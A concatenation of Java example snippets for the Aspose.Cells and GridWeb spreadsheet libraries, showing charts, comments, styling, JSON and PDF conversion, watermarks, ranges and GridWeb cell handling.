//Access the chart
Chart ch = ws.getCharts().get(0);


//Calculate the chart
ch.calculate();


//Read axis labels of category axis
ArrayList lstLabels = ch.getCategoryAxis().getAxisLabels();


//Print axis labels on console
System.out.println(""Category Axis Labels: "");
System.out.println(""---------------------"");


//Iterate axis labels and print them one by one
for(int i=0; i<lstLabels.size(); i++)
{
 System.out.println(lstLabels.get(i));
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load source Excel file
Workbook wb = new Workbook(""sampleSetShapeTypeOfDataLabelsOfChart.xlsx"");


//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);


//Access first chart
Chart ch = ws.getCharts().get(0);


//Access first series
Series srs = ch.getNSeries().get(0);


//Set the shape type of data labels i.e. Speech Bubble Oval
srs.getDataLabels().setShapeType(DataLabelShapeType.WEDGE_ELLIPSE_CALLOUT);


//Save the output Excel file
wb.save(""outputSetShapeTypeOfDataLabelsOfChart.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = """";


// Create directory if it is not already present.
File file = new File(dataDir);
if(!file.exists())
 file.mkdir();


// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Adding a new worksheet to the Workbook object
int sheetIndex = workbook.getWorksheets().add();


// Obtaining the reference of the newly added worksheet by passing its sheet index
Worksheet worksheet = workbook.getWorksheets().get(sheetIndex);


// Adding a comment to ""F5"" cell
int commentIndex = worksheet.getComments().add(""F5"");


// Accessing the newly added comment
com.aspose.cells.Comment comment = worksheet.getComments().get(commentIndex);


// Setting the comment note
comment.setNote( ""Hello Aspose!"");


// Setting the font size of a comment to 14
comment.getFont().setSize(14);


// Setting the font of a comment to bold
comment.getFont().setBold(true);


// Setting the height of the font to 10
comment.setHeightCM(10);


// Setting the width of the font to 2
comment.setWidthCM(2);
 
// Saving the Excel file
workbook.save(dataDir + ""book1.out.xls"");
// Instantiating a Workbook object
 Workbook workbook = new Workbook();


 // Obtaining the reference of first worksheet
 Worksheet worksheet = workbook.getWorksheets().get(0);


 // Accessing the ""A1"" cell from the worksheet
 Cell cell = worksheet.getCells().get(""A1"");


 // Adding some value to the ""A1"" cell
 cell.putValue(""Visit Aspose!"");


 // Setting the horizontal alignment of the text in the ""A1"" cell
 Style style = cell.getStyle();
 //Set text left horizontal alignment
 style.setHorizontalAlignment(TextAlignmentType.RIGHT);
 //Set indent
 style.setIndentLevel(4);
 //Set text top vertical alignment
 style.setVerticalAlignment(TextAlignmentType.TOP);
 cell.setStyle(style);


 // Saving the Excel file
 workbook.save(""book1.xlsx"");
 // Accessing the ""A1"" cell from the worksheet
 Cell cell = worksheet.getCells().get(""A1"");


 // Adding some value to the ""A1"" cell
 cell.putValue(""Visit Aspose!"");


 // Setting the horizontal alignment of the text in the ""A1"" cell
 Style style = cell.getStyle();
 
 // Setting the rotation of the text (inside the cell) to 25
 style.setRotationAngle(25);


 cell.setStyle(style);
 
 //Accessing the ""A2"" cell from the worksheet
 cell = worksheet.getCells().get(""A2"");


 // Adding some value to the ""A1"" cell
 cell.putValue(""Visit Aspose!"");


 // Setting the horizontal alignment of the text in the ""A2"" cell
 style = cell.getStyle();
 
 // Setting the orientation of the text from top to bottom
 style.setRotationAngle(255);


 cell.setStyle(style);
 // Saving the Excel file
 workbook.save(""book1.xlsx"");
Workbook workbook = new Workbook(""SourceExcel.xls"");
workbook.save(""outputExcel.xlsx"", SaveFormat.XLSX);
//Load Source Excel file
Workbook workbook = new Workbook(""sample.xlsx"");


//Save the workbook in JSON format
workbook.save(""sample_out.json"", SaveFormat.JSON);
//Create an options of saving the file.
JsonSaveOptions options = new JsonSaveOptions();


//Set the exporting range.
options.setExportArea(CellArea.createCellArea(""B1"", ""C4""));
 
//Load Source Excel file
Workbook workbook = new Workbook(""sample.xlsx"");


//Save the workbook in JSON format
workbook.save(""sample_out.json"", options);
String inputJson = ""["" +
 "" { BEFORE: 'before cell', TEST: 'asd1', AFTER: 'after cell' },""+
 "" { BEFORE: 'before cell', TEST: 'asd2', AFTER: 'after cell' },""+
 "" { BEFORE: 'before cell', TEST: 'asd3', AFTER: 'after cell' },""+
 "" { BEFORE: 'before cell', TEST: 'asd4', AFTER: 'after cell' }""+
 "" ]"";
String sheetName = ""Sheet1"";
int row = 3;
int column = 2;


//create a Workbook object
Workbook book = new Workbook();
Worksheet worksheet = book.getWorksheets().get(sheetName);


//set JsonLayoutOptions to treat Arrays as Table
JsonLayoutOptions jsonLayoutOptions = new JsonLayoutOptions();
jsonLayoutOptions.setArrayAsTable(true);


JsonUtility.importData(inputJson, worksheet.getCells(), row, column, jsonLayoutOptions);


//save file to xlsx format
book.save(""out.xlsx"");
//Load Source JSON file
Workbook workbook = new Workbook(""sample.json"");


//Save file to xlsx format
workbook.save(""sample_out.xlsx"");
//Create an options of loading the file.
JsonLoadOptions options = new JsonLoadOptions();


//Indicates whether importing each attribute of JsonObject object as one worksheet when all child nodes are array nodes.
options.setMultipleWorksheets(true);


Workbook book = new Workbook(""sample.json"", options);


//save file to xlsx format
book.save(""sample_out2.xlsx"");
 // Instantiate a new Workbook.
 Workbook workbook = new Workbook();


 // Get all the worksheets in the book.
 WorksheetCollection worksheets = workbook.getWorksheets();


 // Get the first worksheet in the worksheets collection.
 Worksheet worksheet = workbook.getWorksheets().get(0);


 // Create a range of cells.
 Range sourceRange = worksheet.getCells().createRange(""A1"", ""A2"");
 // Set a few cells in the range.
 sourceRange.get(0, 0).putValue(""Test"");
 sourceRange.get(1, 0).putValue(""123"");


 // Create target range of cells.
 Range targetRange = worksheet.getCells().createRange(""B1"", ""B2"");
 //Only copy data the range.
 targetRange.CopyData(sourceRange);
 // Instantiate a new Workbook.
 Workbook workbook = new Workbook();


 // Get all the worksheets in the book.
 WorksheetCollection worksheets = workbook.getWorksheets();


 // Get the first worksheet in the worksheets collection.
 Worksheet worksheet = workbook.getWorksheets().get(0);


 // Create a range of cells.
 Range sourceRange = worksheet.getCells().createRange(""A1"", ""A2"");


 // Input some data with some formats into a few cells in the range.
 sourceRange.get(0, 0).putValue(""Test"");
 sourceRange.get(1, 0).putValue(""123"");


 // Create target range of cells.
 Range targetRange = worksheet.getCells().createRange(""B1"", ""B2"");


 // Copy source range to target range in the same workhseet 
 targetRange.copy(sourceRange);


 // Create target range of cells.
 workbook.getWorksheets().add();
 worksheet = workbook.getWorksheets().get(1);


 targetRange = worksheet.getCells().createRange(""A1"", ""A2"");
 // Copy source range to target range in another workhseet 
 targetRange.copy(sourceRange);


 //Copy to another workbook
 Workbook anotherWorkbook = new Workbook();


 worksheet = workbook.getWorksheets().get(0);


 targetRange = worksheet.getCells().createRange(""A1"", ""A2"");
 // Copy source range to target range in another workbook 
 targetRange.copy(sourceRange);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Load sample Excel file containing cells with formatting.
Workbook wb = new Workbook(srcDir + ""sampleChangeCellsAlignmentAndKeepExistingFormatting.xlsx"");


// Access first worksheet.
Worksheet ws = wb.getWorksheets().get(0);


// Create cells range.
Range rng = ws.getCells().createRange(""B2:D7"");


// Create style object.
Style st = wb.createStyle();


// Set the horizontal and vertical alignment to center.
st.setHorizontalAlignment(TextAlignmentType.CENTER);
st.setVerticalAlignment(TextAlignmentType.CENTER);


// Create style flag object.
StyleFlag flag = new StyleFlag();


// Set style flag alignments true. It is most crucial statement.
// Because if it will be false, no changes will take place.
flag.setAlignments(true);


// Apply style to range of cells.
rng.applyStyle(st, flag);


// Save the workbook in XLSX format.
wb.save(outDir + ""outputChangeCellsAlignmentAndKeepExistingFormatting.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Create empty workbook.
Workbook wb = new Workbook();


// Access first worksheet.
Worksheet ws = wb.getWorksheets().get(0);


// Create range A1:B3.
System.out.println(""Creating Range A1:B3\n"");
Range rng = ws.getCells().createRange(""A1:B3"");


// Print range address and cell count.
System.out.println(""Range Address: "" + rng.getAddress());
System.out.println(""Cell Count: "" + rng.getCellCount());


// Formatting console output.
System.out.println(""----------------------"");
System.out.println("""");


// Create range A1.
System.out.println(""Creating Range A1\n"");
rng = ws.getCells().createRange(""A1"");


// Print range offset, entire column and entire row.
System.out.println(""Offset: "" + rng.getOffset(2, 2).getAddress());
System.out.println(""Entire Column: "" + rng.getEntireColumn().getAddress());
System.out.println(""Entire Row: "" + rng.getEntireRow().getAddress());


// Formatting console output.
System.out.println(""----------------------"");
System.out.println("""");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load the sample Excel file
Workbook wb = new Workbook(srcDir + ""sampleGetAllHiddenRowsIndicesAfterRefreshingAutoFilter.xlsx"");
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Apply autofilter
ws.getAutoFilter().addFilter(0, ""Orange"");
 
//True means, it will refresh autofilter and return hidden rows.
//False means, it will not refresh autofilter but return same hidden rows.
int[] rowIndices = ws.getAutoFilter().refresh(true);
 
System.out.println(""Printing Rows Indices, Cell Names and Values Hidden By AutoFilter."");
System.out.println(""--------------------------"");
 
for(int i=0; i<rowIndices.length; i++)
{
 int r = rowIndices[i];
 Cell cell = ws.getCells().get(r, 0);
 System.out.println(r + ""\t"" + cell.getName() + ""\t"" + cell.getStringValue());
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Create workbook
Workbook wb = new Workbook();


//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);


//Access cell A1
Cell cell = ws.getCells().get(""A1"");


//Put some text in cell, it does not have Single Quote at the beginning
cell.putValue(""Text"");


//Access style of cell A1
Style st = cell.getStyle();


//Print the value of Style.QuotePrefix of cell A1
System.out.println(""Quote Prefix of Cell A1: "" + st.getQuotePrefix());


//Put some text in cell, it has Single Quote at the beginning
cell.putValue(""'Text"");


//Access style of cell A1
st = cell.getStyle();


//Print the value of Style.QuotePrefix of cell A1
System.out.println(""Quote Prefix of Cell A1: "" + st.getQuotePrefix());


//Print information about StyleFlag.QuotePrefix property
System.out.println();
System.out.println(""When StyleFlag.QuotePrefix is False, it means, do not update the value of Cell.Style.QuotePrefix."");
System.out.println(""Similarly, when StyleFlag.QuotePrefix is True, it means, update the value of Cell.Style.QuotePrefix."");
System.out.println();


//Create an empty style
st = wb.createStyle();


//Create style flag - set StyleFlag.QuotePrefix as false
//It means, we do not want to update the Style.QuotePrefix property of cell A1's style.
StyleFlag flag = new StyleFlag();
flag.setQuotePrefix(false);


//Create a range consisting of single cell A1
Range rng = ws.getCells().createRange(""A1"");


//Apply the style to the range
rng.applyStyle(st, flag);


//Access the style of cell A1
st = cell.getStyle();


//Print the value of Style.QuotePrefix of cell A1
//It will print True, because we have not updated the Style.QuotePrefix property of cell A1's style.
System.out.println(""Quote Prefix of Cell A1: "" + st.getQuotePrefix());


//Create an empty style
st = wb.createStyle();


//Create style flag - set StyleFlag.QuotePrefix as true
//It means, we want to update the Style.QuotePrefix property of cell A1's style.
flag = new StyleFlag();
flag.setQuotePrefix(true);


//Apply the style to the range
rng.applyStyle(st, flag);


//Access the style of cell A1
st = cell.getStyle();


//Print the value of Style.QuotePrefix of cell A1
//It will print False, because we have updated the Style.QuotePrefix property of cell A1's style.
System.out.println(""Quote Prefix of Cell A1: "" + st.getQuotePrefix());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


import java.util.ArrayList;


import com.aspose.cells.*;
import AsposeCellsExamples.Utils;


public class SpecifyFormulaFieldsWhileImportingDataToWorksheet {
 
 static String outDir = Utils.Get_OutputDirectory();
 
 //User-defined class to hold data items
 public class DataItems
	{
 private int m_Number1;
 private int m_Number2;
 private String m_Formula1;
 private String m_Formula2;
 
 public DataItems(int num1, int num2, String form1, String form2)
		{
 this.m_Number1 = num1;
 this.m_Number2 = num2;
 this.m_Formula1 = form1;
 this.m_Formula2 = form2;
		}


 public int getNumber1()
		{
 return this.m_Number1;
		}
 
 public int getNumber2()
		{
 return this.m_Number2;
		}
 
 public String getFormula1()
		{
 return this.m_Formula1;
		}
 
 public String getFormula2()
		{
 return this.m_Formula2;
		}
 
	}//DataItems




 public void Run() throws Exception
	{
 System.out.println(""Aspose.Cells for Java Version: "" + CellsHelper.getVersion());
 
 //List to hold data items
 ArrayList<DataItems> dis = new ArrayList<DataItems>();
 
 //Define 1st data item and add it in list
 int num1 = 2002;
 int num2 = 3502;
 String form1 = ""=SUM(A2,B2)"";
 String form2 = ""=HYPERLINK(\""https://www.aspose.com\"",\""Aspose Website\"")"";	
 DataItems di = new DataItems(num1, num2, form1, form2);
 dis.add(di);
 
 //Define 2nd data item and add it in list
 num1 = 2003;
 num2 = 3503;
 form1 = ""=SUM(A3,B3)"";
 form2 = ""=HYPERLINK(\""https://www.aspose.com\"",\""Aspose Website\"")"";	
 di = new DataItems(num1, num2, form1, form2);
 dis.add(di);


 //Define 3rd data item and add it in list
 num1 = 2004;
 num2 = 3504;
 form1 = ""=SUM(A4,B4)"";
 form2 = ""=HYPERLINK(\""https://www.aspose.com\"",\""Aspose Website\"")"";	
 di = new DataItems(num1, num2, form1, form2);
 dis.add(di);


 //Define 4th data item and add it in list
 num1 = 2005;
 num2 = 3505;
 form1 = ""=SUM(A5,B5)"";
 form2 = ""=HYPERLINK(\""https://www.aspose.com\"",\""Aspose Website\"")"";	
 di = new DataItems(num1, num2, form1, form2);
 dis.add(di);
 
 //Create workbook object
 Workbook wb = new Workbook();


 //Access first worksheet
 Worksheet ws = wb.getWorksheets().get(0);


 //Specify import table options
 ImportTableOptions opts = new ImportTableOptions();


 //Specify which field is formula field, here the last two fields are formula fields
 //opts.setColumnIndexes(new int[] {3, 0, 2, 1});
 opts.setFormulas(new boolean[] {false, false, true, true });


 //Import custom objects
 ws.getCells().importCustomObjects(dis, 0, 0, opts);


 //Calculate formula
 wb.calculateFormula();


 //Autofit columns
 ws.autoFitColumns();


 //Save the output Excel file
 wb.save(outDir + ""outputSpecifyFormulaFieldsWhileImportingDataToWorksheet.xlsx"");
 
 // Print the message
 System.out.println(""SpecifyFormulaFieldsWhileImportingDataToWorksheet executed successfully."");
	}


 public static void main(String[] args) throws Exception {
 new SpecifyFormulaFieldsWhileImportingDataToWorksheet().Run();
	}
}
//Open encrypted file with password.
 LoadOptions loadOptions = new LoadOptions();
 loadOptions.setPassword(""password"");
 Workbook workbook = new Workbook(""Book1.xlsx"", loadOptions);
 //Remove password.
 workbook.getSettings().setPassword(null);
 //Save the file.
 workbook.save(""Book1.xlsx"");
 // Instantiate a new Workbook.
 Workbook workbook = new Workbook();


 // Get all the worksheets in the book.
 WorksheetCollection worksheets = workbook.getWorksheets();


 // Get the first worksheet in the worksheets collection.
 Worksheet worksheet = workbook.getWorksheets().get(0);


 // Get cells.
 Cells cells = worksheet.getCells();
 // Set a few cells in the range.
 cells.get(""C2"").putValue(""C2"");
 cells.get(""C3"").putValue(""C3"");
 CellArea ca = CellArea.createCellArea(""B2"", ""B3"");
 cells.deleteRange(1,1,2,2, ShiftType.LEFT);
 String b2 = worksheet.getCells().get(""B2"").getStringValue();
 
 // Instantiate a new Workbook.
 Workbook workbook = new Workbook();


 // Get all the worksheets in the book.
 WorksheetCollection worksheets = workbook.getWorksheets();


 // Get the first worksheet in the worksheets collection.
 Worksheet worksheet = workbook.getWorksheets().get(0);


 // Gets cells.
 Cells cells = worksheet.getCells();


 // Get cells.
 Cells cells = worksheet.getCells();
 // Set a few cells in the range.
 cells.get(""B4"").putValue(""B4"");
 cells.get(""B5"").putValue(""B5"");
 cells.deleteRange(1,1,2,1, ShiftType.UP);
//Init workbook instance.
Workbook workbook = new Workbook(""Book1.xlsx"");


//Set autofit options for rendering.
AutoFitterOptions autoFitterOptions = new AutoFitterOptions();
autoFitterOptions.setForRendering(true);


//Autofit rows with options.
workbook.getWorksheets().get(0).autoFitRows(autoFitterOptions);


//Save to pdf.
workbook.save(""output.pdf"", SaveFormat.PDF);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Open the template excel file
Workbook wb = new Workbook(""sheetset-example.xlsx"");


// Set active sheet to output
PdfSaveOptions pdfSaveOptions = new PdfSaveOptions();
pdfSaveOptions.setSheetSet(SheetSet.getActive());


// Save the pdf file with PdfSaveOptions
wb.save(""output.pdf"", pdfSaveOptions);
//prepare a workbook with 3 pages.
Workbook wb = new Workbook();
wb.getWorksheets().get(0).getCells().get(""A1"").putValue(""Page1"");
int index = wb.getWorksheets().add();
wb.getWorksheets().get(index).getCells().get(""A1"").putValue(""Page2"");
index = wb.getWorksheets().add();
wb.getWorksheets().get(index).getCells().get(""A1"").putValue(""Page3"");
wb.getWorksheets().get(index).getPageSetup().setPaperSize(PaperSizeType.PAPER_A_3);


//create a watermark from image(you need to prepare image bytes).
RenderingWatermark watermark = new RenderingWatermark(imageBytes);


//specify offset to alignment.
watermark.setOffsetX(100);
watermark.setOffsetY(200);
//specify rotation
watermark.setRotation(30);


//specify watermark to background.
watermark.setBackground(true);


//specify opacity
watermark.setOpacity(0.6f);


//specify the scale to page(e.g. 100, 50) in percent.
watermark.setScaleToPagePercent(50);


//spcify watermark for rendering to pdf.
PdfSaveOptions options = new PdfSaveOptions();
options.setWatermark(watermark);


wb.save(""oputput_image_watermark.pdf"", options);
//prepare a workbook with 3 pages.
Workbook wb = new Workbook();
wb.getWorksheets().get(0).getCells().get(""A1"").putValue(""Page1"");
int index = wb.getWorksheets().add();
wb.getWorksheets().get(index).getCells().get(""A1"").putValue(""Page2"");
index = wb.getWorksheets().add();
wb.getWorksheets().get(index).getCells().get(""A1"").putValue(""Page3"");
wb.getWorksheets().get(index).getPageSetup().setPaperSize(PaperSizeType.PAPER_A_3);


//create a font for watermark, and specify bold, italic, color.
RenderingFont font = new RenderingFont(""Calibri"", 68);
font.setItalic(true);
font.setBold(true);
font.setColor(Color.getBlue());


//create a watermark from text and the specified font.
RenderingWatermark watermark = new RenderingWatermark(""Watermark"", font);


//specify horizontal and vertical alignment
watermark.setHAlignment(TextAlignmentType.CENTER);
watermark.setVAlignment(TextAlignmentType.CENTER);


//specify rotation
watermark.setRotation(30);


//specify opacity
watermark.setOpacity(0.6f);


//specify the scale to page(e.g. 100, 50) in percent.
watermark.setScaleToPagePercent(50);


//spcify watermark for rendering to pdf.
PdfSaveOptions options = new PdfSaveOptions();
options.setWatermark(watermark);


wb.save(""output_text_watermark.pdf"", options);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Open the template excel file
Workbook wb = new Workbook(""sheetset-example.xlsx"");


// Set all sheets to output
PdfSaveOptions pdfSaveOptions = new PdfSaveOptions();
pdfSaveOptions.setSheetSet(SheetSet.getAll());


// Save the pdf file with PdfSaveOptions
wb.save(""output.pdf"", pdfSaveOptions);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Open the excel file with image, shape, chart, etc.
Workbook wb = new Workbook(""document-structure-example.xlsx"");


// Set to export document structure.
PdfSaveOptions pdfSaveOptions = new PdfSaveOptions();
pdfSaveOptions.setExportDocumentStructure(true);


// Save the pdf file with PdfSaveOptions
wb.save(""output.pdf"", pdfSaveOptions);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Open the template excel file
Workbook wb = new Workbook(""sheetset-example.xlsx"");


// Set custom multiple sheets(Sheet1, Sheet3) to output
SheetSet sheetSet = new SheetSet(new int[] { 0, 2 });
PdfSaveOptions pdfSaveOptions = new PdfSaveOptions();
pdfSaveOptions.setSheetSet(sheetSet);


// Save the pdf file with PdfSaveOptions
wb.save(""output.pdf"", pdfSaveOptions);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Create workbook object.
Workbook wb = new Workbook();


//Access built-in document property collection.
BuiltInDocumentPropertyCollection bdpc = wb.getBuiltInDocumentProperties();


//Set the language of the Excel file.
bdpc.setLanguage(""German, French"");


//Save the workbook in xlsx format.
wb.save(outDir + ""outputSpecifyLanguageOfExcelFileUsingBuiltInDocumentProperties.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load the sample Excel file 
Workbook wb = new Workbook(""sampleAccessAndModifyLabelOfOleObject.xlsx"");


//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);


//Access first Ole Object
OleObject oleObject = ws.getOleObjects().get(0);


//Display the Label of the Ole Object
System.out.println(""Ole Object Label - Before: "" + oleObject.getLabel());


//Modify the Label of the Ole Object
oleObject.setLabel(""Aspose APIs"");


//Save workbook to byte array output stream
ByteArrayOutputStream baos = new ByteArrayOutputStream();
wb.save(baos, SaveFormat.XLSX);


//Convert output to input stream
ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());


//Set the workbook reference to null
wb = null;


//Load workbook from byte array input stream
wb = new Workbook(bais);


//Access first worksheet
ws = wb.getWorksheets().get(0);


//Access first Ole Object
oleObject = ws.getOleObjects().get(0);


//Display the Label of the Ole Object that has been modified earlier
System.out.println(""Ole Object Label - After: "" + oleObject.getLabel());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Load sample Excel file containing gear type smart art shape.
Workbook wb = new Workbook(srcDir + ""sampleExtractTextFromGearTypeSmartArtShape.xlsx"");


// Access first worksheet.
Worksheet ws = wb.getWorksheets().get(0);


// Access first shape.
Shape sh = ws.getShapes().get(0);


// Get the result of gear type smart art shape in the form of group shape.
GroupShape gs = sh.getResultOfSmartArt();


// Get the list of individual shapes consisting of group shape.
Shape[] shps = gs.getGroupedShapes();


// Extract the text of gear type shapes and print them on console.
for (int i = 0; i < shps.length; i++)
{
 Shape s = shps[i];


 if (s.getType() == AutoShapeType.GEAR_9 || s.getType() == AutoShapeType.GEAR_6)
	{
 System.out.println(""Gear Type Shape Text: "" + s.getText());
	}
}//for
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load sample Excel file.
Workbook wb = new Workbook(srcDir + ""sampleRotateTextWithShapeInsideWorksheet.xlsx"");
 
//Access first worksheet.
Worksheet ws = wb.getWorksheets().get(0);
 
//Access cell B4 and add message inside it.
Cell b4 = ws.getCells().get(""B4"");
b4.putValue(""Text is not rotating with shape because RotateTextWithShape is false."");
 
//Access first shape.
Shape sh = ws.getShapes().get(0);
 
//Access shape text alignment.
ShapeTextAlignment shapeTextAlignment = sh.getTextBody().getTextAlignment();
 
//Do not rotate text with shape by setting RotateTextWithShape as false.
shapeTextAlignment.setRotateTextWithShape(false);
 
//Save the output Excel file.
wb.save(outDir + ""outputRotateTextWithShapeInsideWorksheet.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load the sample Excel file
Workbook wb = new Workbook(""sampleSetMarginsOfCommentOrShapeInsideTheWorksheet.xlsx"");


//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);


for(int idx =0; idx<ws.getShapes().getCount(); idx++)
{
 //Access the shape
 Shape sh = ws.getShapes().get(idx);
 
 //Access the text alignment
 ShapeTextAlignment txtAlign = sh.getTextBody().getTextAlignment();


 //Set auto margin false
 txtAlign.setAutoMargin(false);


 //Set the top, left, bottom and right margins
 txtAlign.setTopMarginPt(10);
 txtAlign.setLeftMarginPt(10);
 txtAlign.setBottomMarginPt(10);
 txtAlign.setRightMarginPt(10);	    
}


//Save the output Excel file
wb.save(""outputSetMarginsOfCommentOrShapeInsideTheWorksheet.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Create empty workbook.
Workbook wb = new Workbook();
 
// Access first worksheet.
Worksheet ws = wb.getWorksheets().get(0);
 
// Add textbox inside the worksheet.
int idx = ws.getTextBoxes().add(5, 5, 50, 200);
TextBox tb = ws.getTextBoxes().get(idx);
 
// Set the text of the textbox.
tb.setText(""����˪����ͣ"");
 
// Specify the Far East and Latin name of the font.
tb.getTextOptions().setLatinName(""Comic Sans MS"");
tb.getTextOptions().setFarEastName(""KaiTi"");
 
// Save the output Excel file.
wb.save(""outputSpecifyFarEastAndLatinNameOfFontInTextOptionsOfShape.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = """";
// Instantiating a Workbook object
Workbook workbook = new Workbook(dataDir + ""ThreadedCommentsSample.xlsx"");


//Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Get Threaded Comment
ThreadedComment comment = worksheet.getComments().getThreadedComments(""A1"").get(0);
comment.setNotes(""Updated Comment"");


workbook.save(dataDir + ""EditThreadedComments.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Access first worksheet of gridweb
GridWorksheet sheet = gridweb.getWorkSheets().get(0);


// Access cell A1
GridCell cell = sheet.getCells().get(""A1"");


// Access hyperlink of cell A1 if it contains any
GridHyperlink lnk = sheet.getHyperlinks().getHyperlink(cell);


if (lnk == null) {
// This cell does not have any hyperlink
} else {
// This cell does have hyperlink, access its properties e.g. address
String addr = lnk.getAddress();
}
For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the worksheet of the Grid that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Accessing ""B1"" cell of the worksheet
GridCell cell = sheet.getCells().get(""B1"");


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the worksheet of the Grid that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Accessing ""B1"" cell of the worksheet using its row and column indices
GridCell cell = sheet.getCells().get(0, 1);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the worksheet of the Grid that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Accessing ""B1"" cell of the worksheet
GridCell cell = sheet.getCells().get(""B1"");


//Putting a value in ""B1"" cell
cell.putValue(Calendar.getInstance());


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the worksheet of the Grid that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Accessing ""B1"" cell of the worksheet
GridCell cell = sheet.getCells().get(""B1"");


//Putting a numeric value as string in ""B1"" cell that will be converted to a suitable data type automatically
cell.putValue(""19.4"", true);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the worksheet of the Grid that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Accessing ""B1"" cell of the worksheet
GridCell cell = sheet.getCells().get(""B1"");


//Inserting & modifying the string value of ""B1"" cell
cell.putValue(""Hello Aspose.Grid"");


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the worksheet of the Grid that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Putting some values to cells
sheet.getCells().get(""A1"").putValue(""1st Value"");
sheet.getCells().get(""A2"").putValue(""2nd Value"");
sheet.getCells().get(""A3"").putValue(""Sum"");
sheet.getCells().get(""B1"").putValue(125.56);
sheet.getCells().get(""B2"").putValue(23.93);


//Calculating all formulas added in worksheets
gridweb.getWorkSheets().calculateFormula();


//Adding a simple formula to ""B3"" cell
sheet.getCells().get(""B3"").setFormula(""=SUM(B1:B2)"");


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Calculating all formulas added in worksheets
gridweb.getWorkSheets().calculateFormula();


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Access first worksheet
GridWorksheet sheet = gridweb.getWorkSheets().get(0);


//Access cell B3
GridCell cell = sheet.getCells().get(""B3"");


//Add validation inside the gridcell
//Any value which is not between 20 and 40 will cause error in a gridcell
GridValidation val = cell.createValidation(GridValidationType.WHOLE_NUMBER, true);
val.setFormula1(""=20"");
val.setFormula2(""=40"");
val.setOperator(OperatorType.BETWEEN);
val.setShowError(true);
val.setShowInput(true);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Instantiating a CustomCommandButton object
CustomCommandButton button = new CustomCommandButton();


//Setting the command for button
button.setCommand(""MyButton"");


//Setting text of the button
button.setText(""MyButton"");


//Setting tooltip of the button
button.setToolTip(""My Custom Command Button"");


//Setting image URL of the button
button.setImageUrl(""icon.png"");


//Adding button to CustomCommandButtons collection of GridWeb
gridweb.getCustomCommandButtons().add(button);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Access cell A1 of first gridweb worksheet
GridCell cellA1 = gridweb.getWorkSheets().get(0).getCells().get(""A1"");


//Access cell style and set its number format to 10 which is a Percentage 0.00% format
GridTableItemStyle st = cellA1.getStyle();
st.setNumberType(10);
cellA1.setStyle(st);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Create custom command event handler to handle the click event
CustomCommandEventHandler cceh=new CustomCommandEventHandler(){
	public void handleCellEvent(Object sender, String command){


	    //Identifying a specific button by checking its command
	    if (command.equals(""MyButton""))
	    {
	        //Accessing the cells collection of the worksheet that is currently active
	        GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


	        //Putting value to ""A1"" cell
	        sheet.getCells().get(""A1"").putValue(""My Custom Command Button is Clicked."");
	        sheet.getCells().setColumnWidth(0, 50);
	    }
	}
};


//Assign the custom command event handler created above to gridweb
gridweb.CustomCommand = cceh;


